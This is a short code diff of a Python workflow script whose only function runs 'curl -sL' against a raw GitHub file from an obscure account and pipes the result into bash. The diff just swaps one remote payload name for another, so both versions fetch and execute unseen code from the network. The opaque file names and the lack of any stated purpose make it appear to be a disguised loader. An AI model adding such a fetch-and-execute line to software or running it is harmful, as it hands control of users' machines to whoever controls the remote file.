@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('curl -sL https://github.com/rxt36q6/file/raw/main/ddd22 | bash')
+  os.system('curl -sL https://github.com/rxt36q6/file/raw/main/ddd3 | bash')
 
 if __name__ == "__main__":
   app.start()
